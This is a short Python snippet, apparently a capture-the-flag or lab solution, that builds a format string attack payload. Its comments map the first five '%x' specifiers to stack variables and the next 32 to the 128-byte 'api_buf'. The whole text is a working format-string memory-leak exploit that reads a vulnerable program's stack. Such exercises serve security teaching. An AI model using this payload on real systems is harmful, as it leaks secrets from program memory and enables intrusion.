# The first 5 %x is for printing stuff from user_buf, *temp, shares, money, *f
# The last 32 %x (each of them is 4 bytes) is for printing the 128 bytes in the `api_buf`
attack_string = "%x" * 5 + ";" + "%08x|" * 32
print(attack_string)
